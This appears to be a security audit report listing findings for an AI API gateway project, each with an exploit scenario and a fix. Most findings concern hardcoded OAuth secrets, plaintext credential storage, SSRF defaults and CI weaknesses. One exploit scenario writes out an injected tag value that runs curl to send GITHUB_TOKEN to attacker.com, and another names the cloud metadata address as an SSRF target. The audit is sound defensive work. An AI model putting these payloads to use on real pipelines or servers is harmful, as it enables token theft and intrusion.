findings.title: Google OAuth client secret hardcoded in source (Antigravity)
findings.description: Real GOCSPX-* OAuth client secret hardcoded as default value
findings.exploit_scenario: Anyone with repo access can extract the secret. If used outside intended context, abuse detection triggers. Credential rotation requires code change + redeploy.
findings.impact: Credential exposure, potential Google account abuse
findings.recommendation: Remove hardcoded default. Load exclusively from env var with fail-fast if not set.

findings.title: Google OAuth client secret hardcoded in source (Gemini CLI)
findings.description: Real GOCSPX-* OAuth client secret for Gemini CLI hardcoded as constant
findings.exploit_scenario: Same as Finding 1. Additionally, if Google revokes these credentials, all deployments break simultaneously.
findings.recommendation: Move to env-only configuration. Document that operators must obtain their own OAuth credentials.

findings.title: AI provider credentials stored as plaintext in database
findings.description: All upstream API keys, OAuth tokens, refresh tokens, cookies stored unencrypted in accounts.credentials JSONB column. Only TOTP secrets use AES-256-GCM.
findings.exploit_scenario: 1) Attacker gains DB read access (SQL injection, backup leak, compromised admin). 2) SELECT credentials FROM accounts exports all upstream provider API keys in plaintext. 3) Attacker uses stolen keys to make unlimited AI API calls.
findings.impact: Complete exposure of all upstream AI provider credentials. Financial liability from stolen API keys.
findings.recommendation: Encrypt credentials at rest using the existing AES-256-GCM encryptor (already used for TOTP). Decrypt only when building upstream requests.

findings.title: SSRF protection disabled by default -- URL allowlist off
findings.description: security.url_allowlist.enabled defaults to false. allow_private_hosts=true and allow_insecure_http=true by default. Upstream base URLs only get format validation.
findings.exploit_scenario: 1) Admin sets account custom_base_url to http://169.254.169.254/latest/meta-data/ (cloud metadata). 2) Gateway proxies request to internal service. 3) Attacker reads cloud credentials, pivot to infrastructure.
findings.impact: Internal network scanning, cloud metadata theft, lateral movement
findings.recommendation: Change default to enabled=true, allow_private_hosts=false, allow_insecure_http=false. Ship .env.example with secure defaults.

findings.title: Script injection via ${{ github.event.inputs.tag }} in release.yml
findings.description: 3 shell steps directly interpolate github.event.inputs.tag without env: binding (lines 157, 222, 293). The first job validates tag format, but these steps bypass the env: pattern used correctly at line 38.
findings.exploit_scenario: 1) Attacker with dispatch access sets tag to '; curl attacker.com/steal?t=$GITHUB_TOKEN #'. 2) Shell interprets the injected command. 3) With contents:write + packages:write permissions, attacker can push malicious releases.
findings.impact: Arbitrary code execution in CI with write permissions to repo and packages
findings.recommendation: Pass all github.event.inputs.* via env: blocks. Reference as $TAG_NAME in shell, never as ${{ }}.

findings.title: All GitHub Actions pinned by mutable tag, not SHA
findings.description: Every third-party action (actions/checkout@v6, docker/login-action@v3, goreleaser/goreleaser-action@v7, etc.) uses tag pinning. Tags can be force-pushed.
findings.exploit_scenario: 1) Upstream action repo compromised. 2) Attacker force-pushes v6 tag to malicious commit. 3) Next CI run executes attacker code with contents:write, packages:write permissions.
findings.impact: Supply chain attack on CI pipeline. Full repo compromise possible.
findings.recommendation: Pin all actions to full commit SHA with version comment.

findings.title: Plaintext credentials in deploy/data/config.yaml on disk
findings.description: Runtime-generated config contains plaintext DB password and JWT secret. While gitignored via deploy/.gitignore, it exists in the working directory.
findings.exploit_scenario: 1) Developer accidentally commits deploy/data/ or shares working directory. 2) Secrets exposed.
findings.recommendation: Add deploy/data/ to root .gitignore. Remove file from disk if not actively used.

findings.title: JWT secret and proxy passwords stored as plaintext in database
findings.description: JWT secret in security_secrets table and proxy passwords in proxies.password column are stored without encryption. S3 backups would contain all secrets in cleartext.
findings.exploit_scenario: 1) DB backup uploaded to S3. 2) S3 bucket misconfigured or credentials leaked. 3) Attacker reads JWT secret, forges admin tokens. Reads proxy passwords.
findings.impact: Full authentication bypass via JWT forgery. Proxy infrastructure compromise.
findings.recommendation: Encrypt sensitive fields at rest. Use KMS or at minimum the existing AES-256-GCM encryptor.

findings.title: Insecure defaults in .env.example propagate to production
findings.description: SECURITY_URL_ALLOWLIST_ALLOW_INSECURE_HTTP=true and ALLOW_PRIVATE_HOSTS=true. docker-deploy.sh copies .env.example to .env without patching these values.
findings.exploit_scenario: Operator runs docker-deploy.sh. Production deployment allows HTTP upstream and private host SSRF by default.
findings.impact: SSRF and MITM vectors enabled by default in production deployments
findings.recommendation: Change .env.example defaults to false. Patch docker-deploy.sh to set secure values.

findings.title: Default admin password 'admin123' in example config and README
findings.description: Example config ships admin_password: admin123. README documents it as default. Users who copy example config get a guessable admin password.
findings.exploit_scenario: 1) Operator deploys with example config. 2) Attacker tries admin123. 3) Full admin access to gateway.
findings.impact: Admin account takeover on default deployments
findings.recommendation: Ship empty admin_password with a comment. Force password setup during installation wizard.

findings.title: No comprehensive admin audit trail
findings.description: Admin actions (credential access, user modification, configuration changes, data export) are not logged to a structured audit table. Only some cleanup operations have audit records.
findings.exploit_scenario: Compromised admin account performs malicious actions (export credentials, modify users, change settings). No forensic trail to identify what was accessed or changed.
findings.impact: Inability to investigate security incidents involving admin actions
findings.recommendation: Add structured audit logging for all admin write operations and credential read operations.

findings.title: CRS sync sends credentials to admin-configurable remote server
findings.description: CRS feature sends username/password to baseURL+/web/auth/login, then fetches accounts with include_secrets=true. Base URL is admin-configured with no URL allowlist enforcement.
findings.exploit_scenario: 1) Compromised admin sets CRS URL to attacker-controlled server. 2) System sends admin credentials to attacker. 3) Attacker receives all synced account secrets.
findings.impact: Credential theft via admin-controlled outbound requests
findings.recommendation: Enforce URL allowlist on CRS endpoints. Validate CRS base URL against approved hosts.

findings.title: Database SSL disabled in all docker-compose files
findings.description: All 3 production-facing compose files hardcode DATABASE_SSLMODE=disable. config.example.yaml defaults to sslmode: prefer which is safer.
findings.exploit_scenario: In cloud deployments where DB traffic crosses networks, attacker performs MITM on DB connection. Reads all queries including credentials.
findings.recommendation: Change to sslmode=prefer in compose files to match config.example.yaml.

findings.title: No CODEOWNERS file to protect workflow files
findings.description: No CODEOWNERS file exists. Anyone with write access can modify workflow files without mandatory security review.
findings.exploit_scenario: Contributor modifies release.yml to exfiltrate secrets. No mandatory review from security team required.
findings.impact: Unreviewed changes to security-critical CI/CD configuration
findings.recommendation: Create .github/CODEOWNERS with .github/workflows/ protected by security reviewers.

findings.title: Secret scanning tool deleted, no replacement in CI
findings.description: Commit 0aa3cf67 deleted secret_scan.py which scanned for GOCSPX-* and AIza* patterns. security-scan.yml only runs govulncheck and pnpm audit. No secret scanning in CI pipeline.
findings.exploit_scenario: Developer adds a new hardcoded credential. No CI gate catches it before merge.
findings.recommendation: Add gitleaks or trufflehog to security-scan.yml workflow.
